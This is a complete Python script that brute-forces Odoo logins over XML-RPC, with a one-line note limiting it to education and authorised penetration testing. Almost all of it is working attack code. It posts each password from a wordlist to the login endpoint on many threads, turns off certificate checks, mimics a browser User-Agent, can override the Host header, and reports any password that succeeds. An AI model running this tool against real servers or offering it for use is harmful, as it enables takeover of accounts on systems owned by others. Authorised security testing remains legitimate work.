#!/usr/bin/env python3
"""
Odoo XML-RPC Brute Forcer
For educational and authorized penetration testing only.

Usage:
    python3 odoo_bruteforcer.py --url https://target.com --db mydb --user admin --wordlist passwords.txt
"""

import argparse
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def try_login(url, db, user, password, host_header=None):
    xml = f"""<?xml version='1.0'?><methodCall><methodName>login</methodName>
    <params>
    <param><value><string>{db}</string></value></param>
    <param><value><string>{user}</string></value></param>
    <param><value><string>{password}</string></value></param>
    </params></methodCall>"""
    headers = {"Content-Type": "text/xml", "User-Agent": "Mozilla/5.0"}
    if host_header:
        headers["Host"] = host_header
    try:
        r = requests.post(f"{url}/xmlrpc/2/common", data=xml,
                          headers=headers, timeout=10, verify=False)
        if '<int>' in r.text and '<boolean>0</boolean>' not in r.text:
            return password
    except Exception:
        pass
    return None

def main():
    parser = argparse.ArgumentParser(description="Odoo XML-RPC Brute Forcer")
    parser.add_argument("--url", required=True, help="Base URL, e.g. https://target.com")
    parser.add_argument("--db", required=True, help="Database name")
    parser.add_argument("--user", default="admin", help="Username (default: admin)")
    parser.add_argument("--wordlist", required=True, help="Path to password wordlist")
    parser.add_argument("--threads", type=int, default=10, help="Threads (default: 10)")
    parser.add_argument("--host", help="Optional Host header override")
    args = parser.parse_args()

    with open(args.wordlist, "r", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Testing {len(passwords)} passwords against {args.url} (db: {args.db}, user: {args.user})")

    found = False
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(try_login, args.url, args.db, args.user, pw, args.host): pw for pw in passwords}
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"\n[+] SUCCESS: {args.user} / {result}\n")
                found = True
                executor.shutdown(wait=False, cancel_futures=True)
                break

    if not found:
        print("\n[-] No valid password found in wordlist.")

if __name__ == "__main__":
    main()
